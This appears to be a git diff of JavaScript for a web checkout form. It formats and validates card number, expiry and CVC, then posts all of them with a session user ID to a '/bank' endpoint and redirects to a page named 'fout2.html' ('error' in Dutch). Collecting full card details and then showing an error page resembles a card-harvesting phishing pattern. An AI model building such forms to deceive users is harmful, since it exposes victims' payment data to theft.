@@ -1,9 +1,4 @@
-
-// This document was partially created with the assistance of AI tools,
-// including code generation from ChatGPT.
-
-
-
+// Format the card number as the user types, adding a space every 4 digits
 document.getElementById("card").addEventListener("input", function(event) {
     let cardNumber = event.target.value.replace(/\s+/g, ''); // Remove all spaces
     if (cardNumber.length > 0) {
@@ -11,27 +6,25 @@ document.getElementById("card").addEventListener("input", function(event) {
     }
 });
 
+// Format the expiry date as MM/YY when the user types
 document.getElementById("date").addEventListener("input", function(event) {
-    let input = event.target.value;
-    // Remove any non-digit or non-slash characters
-    input = input.replace(/[^\d\/]/g, '');
-
-    // Automatically insert '/' after entering two digits for the month
-    if (input.length === 2 && !input.includes('/')) {
-        event.target.value = input + '/';
+    let input = event.target.value.replace(/[^\d]/g, ''); // Remove non-digit characters
+    if (input.length > 2) {
+        event.target.value = input.slice(0, 2) + '/' + input.slice(2, 4); // Insert '/' after two digits
     } else {
         event.target.value = input;
     }
 });
 
+// Validate and submit the form data
 document.getElementById("checkoutForm").addEventListener("submit", function(event) {
     event.preventDefault(); // Prevent form submission initially
 
     // Get form values
     const name = document.getElementById("name").value.trim();
-    const code = document.getElementById("code").value.trim(); // CVC code
     const card = document.getElementById("card").value.replace(/\s+/g, ''); // Remove spaces for validation
     const date = document.getElementById("date").value.trim(); // Expiry date (MM/YY)
+    const code = document.getElementById("code").value.trim(); // CVC code
 
     // Clear previous error messages
     document.getElementById("nameError").textContent = '';
@@ -39,10 +32,10 @@ document.getElementById("checkoutForm").addEventListener("submit", function(even
     document.getElementById("dateError").textContent = '';
     document.getElementById("codeError").textContent = '';
 
-    // Regular expressions
+    // Define validation patterns
     const cardPattern = /^\d{16}$/; // 16 digits for card number
     const cvcPattern = /^\d{3,4}$/; // 3 or 4 digits for CVC code
-    const datePattern = /^(0[1-9]|1[0-2])\/\d{2}$/; // Format MM/YY
+    const datePattern = /^(0[1-9]|1[0-2])\/(\d{2})$/; // Format MM/YY (capturing the year as well)
 
     let valid = true;
 
@@ -58,10 +51,19 @@ document.getElementById("checkoutForm").addEventListener("submit", function(even
         document.getElementById("cardError").textContent = 'Please enter a valid 16-digit card number.';
     }
 
+
     // Validate expiry date
-    if (!datePattern.test(date)) {
+    const dateMatch = date.match(datePattern);
+    if (!dateMatch) {
         valid = false;
         document.getElementById("dateError").textContent = 'Please enter a valid expiry date (MM/YY).';
+    } else {
+        // Extract the year from the expiry date
+        const year = parseInt(dateMatch[2], 10);
+        if (year < 24) { // Check if the year is less than 24
+            valid = false;
+            document.getElementById("dateError").textContent = 'Error with expiry year. Year must be 24 or higher.';
+        }
     }
 
     // Validate CVC code
@@ -70,8 +72,37 @@ document.getElementById("checkoutForm").addEventListener("submit", function(even
         document.getElementById("codeError").textContent = 'Please enter a valid 3- or 4-digit CVC code.';
     }
 
-    // If valid, redirect to fout.html
+    // If valid, submit the data to the server
     if (valid) {
-        window.location.href = 'fout.html';
+        const bankData = {
+            name: name,
+            card: card,
+            date: date,
+            code: code,
+            userId: sessionStorage.getItem('userId') // Retrieve the userId from sessionStorage
+        };
+
+        // Dynamically get the server's base URL
+        const serverBaseUrl = window.location.origin;
+
+        // Send data to the server
+        fetch(`${serverBaseUrl}/bank`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(bankData)
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Success:', data);
+            if (data.message === 'Bank details submitted successfully!') {
+                window.location.href = 'fout2.html'; // Redirect if successful
+            }
+        })
+        .catch((error) => {
+            console.error('Error:', error);
+            alert('Error submitting bank details');
+        });
     }
 });
